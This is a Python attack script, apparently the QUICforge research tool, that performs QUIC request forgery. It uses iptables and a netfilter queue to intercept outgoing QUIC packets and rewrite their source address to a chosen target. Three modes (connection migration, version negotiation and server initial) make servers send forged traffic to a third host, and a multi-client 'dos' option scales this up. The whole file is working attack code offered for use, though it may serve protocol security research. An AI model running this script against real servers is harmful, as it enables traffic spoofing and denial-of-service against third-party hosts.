#!/usr/bin/python3

#from concurrent.futures import process
from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import subprocess
import os
import ssl
import argparse
from argparse import RawTextHelpFormatter
from multiprocessing import Process

import aioquic
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h0.connection import H0_ALPN, H0Connection
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import (
    DataReceived,
    H3Event,
    HeadersReceived,
    PushPromiseReceived,
)
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent
from aioquic.tls import CipherSuite, SessionTicket

from aioquic.quic.packet import QuicProtocolVersion

import minimal_http_client as cl


banner = '''
   ____  _    _ _____ _____ ______
  / __ \| |  | |_   _/ ____|  ____|
 | |  | | |  | | | || |    | |__ ___  _ __ __ _  ___
 | |  | | |  | | | || |    |  __/ _ \| '__/ _` |/ _ \\
 | |__| | |__| |_| || |____| | | (_) | | | (_| |  __/
  \___\_\\\\____/|_____\_____|_|  \___/|_|  \__, |\___|
                                           __/ |
                                          |___/
'''

SPOOFED_COUNT = 0

# Iptables Templates
iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"

# Legacy Lsquic support, adjust to the correct install path
lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K -o scid_len=20"
lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN

def parse_arguments():

    gen_desc = "QUIC Request Forgery Attack Script"
    parser = argparse.ArgumentParser(description=gen_desc)
    parser._optionals.title = 'Optional Arguments'
    parser._positionals.title = 'Required Arguments'

    #General Options
    optparser = argparse.ArgumentParser(add_help=False)
    optparser.add_argument('victim_ip', help='The victim\'s IP address. The victim is the server the quic connection is established with')
    optparser.add_argument('target_ip', help='The target\'s IP address. The target is the host the forged request is send to')
    optparser.add_argument('--victim_port','-v', help='The vicitm\'s listening port. Default ist 12345', default=12345, type=int)
    optparser.add_argument('--target_port','-t', help='The target\'s listening port', default=0, type=int)
    optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
    optparser.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='h3')
    optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,21), metavar="[1-22]")
    #optparser.add_argument('--verbose','-v', help='Turn on stdout and stderr for client subprocesses', action='store_true')

    subparsers = parser.add_subparsers(required=True, dest='mode')
    
    #Parser for CMRF
    parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
    parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
    parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
    parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode for CMRF that uses the lsquic client instead of the aioquc implementation', action='store_true', default=False)
    parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')

    parser_cm._optionals.title = 'Optional Arguments'
    parser_cm._positionals.title = 'Required Arguments'



    #Parser for VNRF
    parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[optparser], description=gen_desc + '\n Version Negotiation Mode', formatter_class=RawTextHelpFormatter)
    parser_vn._optionals.title = 'Optional Arguments'
    parser_vn._positionals.title = 'Required Arguments'
    parser_vn.add_argument('--cid_len','-c', help='Length of the CID used in the initial message (currently SCID/DCID are the same length)', choices=range(0,256), metavar="[0-255]", type=int, default=20)

    #Parser for SIRF
    parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
    parser_si._optionals.title = 'Optional Arguments'
    parser_si._positionals.title = 'Required Arguments'

    return parser.parse_args()


def spoof_packet(packet, ip, port=0):
    
    payload = IP(packet.get_payload())
        
    # Set spoofed source address
    old_ip = payload.src
    payload.src = ip

    old_port = payload.sport
    if port != 0:
        payload.sport = port

    # Recalculate checksums for IP and UDP
    del payload[IP].chksum
    del payload[UDP].chksum
    payload = payload.__class__(bytes(payload))
    packet.set_payload(bytes(payload))
    print("[*] {old_ip}:{old_port} -> {ip}:{port}".format(old_ip=old_ip, old_port=old_port, ip=ip, port=(port if port !=0 else old_port)))

    return packet


def connection_migration_callback(packet, starttime=0, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        return

    if time.time()-starttime > args.start_time:
        packet = spoof_packet(packet, args.target_ip, args.target_port)
        if args.limit != 0:
            SPOOFED_COUNT += 1

    packet.accept()
    

def version_negotiation_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1
    
    packet.accept()
    

def server_initial_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1

    packet.accept()


def configure_client(args):
    if args.path[0] != "/":
        args.path = "/" + args.path
    url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
    version = 'VNRF' if args.mode == "vn" else "VERSION_1"
    cid_len = args.cid_len if "cid_len" in args else 20

    configuration = QuicConfiguration(
        is_client=True, 
        supported_versions =  [QuicProtocolVersion[version].value],
        alpn_protocols=[args.alpn],
        verify_mode = ssl.CERT_NONE,
        secrets_log_file = open("secrets/secrets.log","w"),
        connection_id_length = cid_len,
    )
    
    return url, configuration


def configure_legacy_client(args):
    cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
    if args.version and args.version != '1':
        cmd += lsquic_client_flag_version.format(version=args.version)     
    if args.alpn and args.alpn != '':
        cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
    
    return cmd


def main():

    if os.geteuid() != 0:
        exit("[!] Please run this script as root")

    args = parse_arguments()
    print(banner)

    starttime = time.time()
    iptables_insert = iptables_tmpl.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print("[+] Inserting iptables rules.")
    print(iptables_insert)
    subprocess.run(iptables_insert.split())
    
    try:
        #Initializing netfilter queue
        q = NetfilterQueue()
        if args.mode == 'cm':
            args.limit = args.limit * args.dos
            q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
        elif args.mode == 'vn':
            args.limit = args.dos
            q.bind(1, lambda packet, args=args : version_negotiation_callback(packet, args))
        elif args.mode == 'si':
            args.limit = args.dos
            q.bind(1, lambda packet,args=args : server_initial_callback(packet, args))
        else:
            raise NotImplementedError("Mode not implemented")

        print("[+] Starting client")
        processes = []
        if args.legacy:
            print("[!] legacy mode")
            cmd = configure_legacy_client(args)
            print(cmd)
            p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            processes.append(p)
        else:
            url, configuration = configure_client(args)
            for i in range(1,args.dos+1):
                p = Process(target=cl.start_client, args=(url, configuration,))
                processes.append(p)
                p.start()
        
        print("[+] Hooking into nfqueue")
        q.run()

    except KeyboardInterrupt:
        print("[-] Keyboard interrupt received. Terminating attack script.")
    except Exception as e:
        print("[!] Something went wrong!")
        print(e)
    
    print("\n[+] Cleaning up")     
    print("[-] Terminating Client(s)")
    
    for p in processes:
        try:
            p.terminate()
        except:
            pass   
    print("[-] Unbinding netfilter queue.")
    q.unbind() 
    
    print("[-] Deleting iptables rule(s).")
    iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print(iptables_delete)
    subprocess.run(iptables_delete.split())
    print("[+] Done")

    
if __name__ == "__main__":
    main()
